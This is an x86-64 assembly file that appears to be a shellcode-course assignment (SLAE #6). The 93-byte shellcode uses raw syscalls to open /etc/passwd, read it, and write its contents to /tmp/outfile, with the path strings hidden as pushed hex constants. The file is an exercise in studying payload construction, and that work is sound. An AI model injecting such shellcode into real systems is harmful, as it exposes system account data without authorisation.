; Author :      Demey Alexandre (PA-14186)
; Date :        03-06-2020
; 
; Description : SLAE assignment #6 
;
; Shellcode length : 93 bytes


global _start
section .text

_start:

        xor esi, esi
        mul esi
        push rax
        mov ecx, 0x64777373
        push rcx
        mov rcx, 0x61702f2f6374652f
        push rcx
        mov rdi, rsp
        mov al, 2
        syscall                 ;rdx 0, rsi 0 

        xchg rsi, rdi
        xchg edi, eax
        mov eax, edx
        or dx, 0xFFFF
        syscall


        xchg r13, rax
        mov rbx, rsp

        xor eax, eax
        push rax
        xchg eax, esi
        mov rax, 0x656c6966
        push rax
        mov rax, 0x74756f2f706d742f
        push rax
        xor eax, eax
        mov al, 0x66
        xchg eax, esi
        mov al, 2
        mov rdi, rsp
        syscall

        mov edi, eax
        xor eax, eax
        inc eax
        lea rsi, [rbx]
        xchg rdx, r13
        syscall
